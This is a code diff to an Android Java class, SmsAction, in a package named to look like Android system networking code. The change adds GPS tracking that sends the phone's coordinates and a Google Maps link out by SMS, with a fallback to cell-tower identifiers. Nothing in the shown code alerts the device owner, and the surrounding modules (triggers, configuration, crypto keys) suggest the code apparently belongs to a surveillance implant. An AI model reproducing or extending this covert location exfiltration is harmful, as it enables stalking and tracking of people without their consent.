@@ -9,24 +9,35 @@
 
 package com.android.networking.action;
 
+import java.util.Date;
+import java.util.Locale;
+
+import android.content.Context;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
+import android.os.Bundle;
 import android.telephony.SmsManager;
 
 import com.android.networking.CellInfo;
 import com.android.networking.Device;
 import com.android.networking.Messages;
+import com.android.networking.Status;
 import com.android.networking.Trigger;
 import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfAction;
 import com.android.networking.conf.ConfigurationException;
+import com.android.networking.crypto.Keys;
+import com.android.networking.module.position.GPSLocationListener;
+import com.android.networking.module.position.GPSLocatorAuto;
 import com.android.networking.util.Check;
 import com.android.networking.util.StringUtils;
 import com.android.networking.util.Utils;
 
-// TODO: Auto-generated Javadoc
 /**
  * The Class SmsAction.
  */
-public class SmsAction extends SubAction {
+public class SmsAction extends SubAction implements GPSLocationListener {
 	private static final String TAG = "SmsAction"; //$NON-NLS-1$
 
 	/** The Constant TYPE_LOCATION. */
@@ -162,25 +173,8 @@ public class SmsAction extends SubAction {
 				return true;
 
 			case TYPE_LOCATION:
-				// TODO Implementare il location
-				// http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
-				// if (!getGPSPosition()) {
-				// errorLocation();
-				// }
-
-				final CellInfo c = Device.getCellInfo();
-
-				if (c.cdma && c.valid) {
-					text = Messages.getString("1_1") + c.sid + Messages.getString("1_2") + c.nid + Messages.getString("1_3") + c.bid; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
-					sendSMS(text);
-				}
-
-				if (c.gsm && c.valid) {
-					text = Messages.getString("1_4") + c.mcc + Messages.getString("1_5") + c.mnc + Messages.getString("1_6") + c.lac + Messages.getString("1_7") + c.cid; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
-					sendSMS(text);
-				}
-
-				break;
+				getGPSPosition();
+				return true;
 			}
 			return true;
 		} catch (final Exception ex) {
@@ -195,6 +189,7 @@ public class SmsAction extends SubAction {
 			return false;
 		}
 	}
+
 
 	/**
 	 * Error location.
@@ -211,18 +206,30 @@ public class SmsAction extends SubAction {
 	 * @return the cell position
 	 */
 	private boolean getCellPosition() {
-		// TODO Auto-generated method stub
+		final CellInfo c = Device.getCellInfo();
+
+		if (c.cdma && c.valid) {
+			text = Messages.getString("1_1") + c.sid + Messages.getString("1_2") + c.nid + Messages.getString("1_3") + c.bid; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
+			sendSMS(text);
+			return true;
+		}
+
+		if (c.gsm && c.valid) {
+			text = Messages.getString("1_4") + c.mcc + Messages.getString("1_5") + c.mnc + Messages.getString("1_6") + c.lac + Messages.getString("1_7") + c.cid; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
+			sendSMS(text);
+			return true;
+		}
+
 		return false;
 	}
 
 	/**
 	 * Gets the gPS position.
-	 * 
-	 * @return the gPS position
 	 */
-	private boolean getGPSPosition() {
-		// TODO Auto-generated method stub
-		return false;
+	private void getGPSPosition() {
+		if(!GPSLocatorAuto.self().start(this)){
+			getCellPosition();
+		}
 	}
 
 	/**
@@ -255,5 +262,37 @@ public class SmsAction extends SubAction {
 		sb.append(Messages.getString("1_15") + text); //$NON-NLS-1$
 
 		return sb.toString();
+	}
+
+	@Override
+	public void onLocationChanged(Location location) {
+		
+		GPSLocatorAuto.self().unregister(this);
+		if (location == null) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " location is null");
+			}
+
+			if(!getCellPosition()){
+				errorLocation();
+			}
+			return;
+		}
+
+		final double lat = location.getLatitude();
+		final double lng = location.getLongitude();
+		
+		String text = String.format(Locale.US, "lat:%.5f lon:%.5f", lat,lng);
+		final Date date = new Date(location.getTime());
+		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " " + date +" " + text);//$NON-NLS-1$ //$NON-NLS-2$
+		}
+
+		String instance = new String(Keys.self().getBuildId());
+		String textMaps = String.format(Locale.US, "https://maps.google.com/maps?q=%.5f,+%.5f", lat, lng);
+		
+		sendSMS(textMaps);
+
 	}
 }
